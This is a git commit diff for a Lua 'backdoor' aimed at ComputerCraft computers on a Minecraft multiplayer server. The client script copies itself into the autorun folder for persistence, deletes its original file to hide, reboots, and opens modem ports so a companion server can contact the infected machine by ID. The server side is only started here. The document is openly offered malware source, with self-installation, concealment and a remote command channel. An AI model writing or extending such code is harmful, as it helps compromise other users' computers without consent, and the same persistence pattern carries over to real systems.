e5b2a9de699efbad679406b153a1f8b956dda248
Hawk <30607615+haawwkeye@users.noreply.github.com>
2022-07-22 11:35:09 -0400

    Format client and add a tiny bit of server code

--- BackdoorClient.lua
+++ BackdoorClient.lua
@@ -1,22 +1,31 @@
 -- computer craft SMP backdoor!
 local pwd = shell.getRunningProgram();
+
 if not fs.exists("/rom/autorun/backdoor.lua") then
-local _self = fs.open(pwd, "r");
-local file = fs.open("/rom/autorun/backdoor.lua", "w");
-file.write(_self.readAll());
-_self.close();
-file.close();
-fs.delete(pwd); -- Hopefully deletes the script
-os.reboot();
+    local _self = fs.open(pwd, "r");
+    local file = fs.open("/rom/autorun/backdoor.lua", "w");
+
+    file.write(_self.readAll());
+
+    _self.close();
+    file.close();
+
+    fs.delete(pwd); -- Hopefully deletes the script
+
+    os.reboot();
 end
 -- This is how I make the backdoor auto run
+
 function shutdown(msg)
-print(msg)
-os.shutdown()
+    print(msg)
+    os.shutdown()
 end
+
 local id = os.getComputerID();
 local port = 1489;
 local modem = peripheral.find("modem") or shutdown("A modem is required");
+
+modem.open(port); -- This is so the server can request the id
 modem.open(port+id);
 
 modem.transmit(port, port+id, id .. " Ready!")
--- BackdoorServer.lua
+++ BackdoorServer.lua
@@ -1,1 +1,5 @@
 --Server for backdoor commands
+local port = 1489;
+local modem = peripheral.find("modem") or error("A modem is required");
+
+modem.open(port); -- This is so the server can request the id
